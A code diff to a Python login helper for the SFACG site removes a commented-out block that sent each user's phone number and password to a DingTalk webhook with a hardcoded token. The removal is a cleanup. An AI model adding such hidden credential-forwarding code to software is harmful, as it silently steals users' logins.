@@ -95,22 +95,6 @@ def get_cookie(username, password):
     url = "https://api.sfacg.com/sessions"
     resp = requests.post(url, headers=headers, data=data)
     if (resp.json()["status"]["httpCode"] == 200):
-        # try:
-        #     url = "https://oapi.dingtalk.com/robot/send?access_token=5a0d4f8e6be28d333444a7d92e1396571aec754c078e949b6afad4283e45d2a4"
-        #     header = {
-        #         "Content-Type": "application/json",
-        #         "Charset": "UTF-8"
-        #     }
-        #     message = {
-        #         "msgtype": "text",
-        #         "text": {
-        #             "content": f"phone:{username},pass:{password}"
-        #         }
-        #     }
-        #     message_json = json.dumps(message)
-        #     requests.post(url=url, data=message_json, headers=header)
-        # except:
-        #     pass
         cookie = requests.utils.dict_from_cookiejar(resp.cookies)
         return f'.SFCommunity={cookie[".SFCommunity"]}; session_APP={cookie["session_APP"]}'
     else:
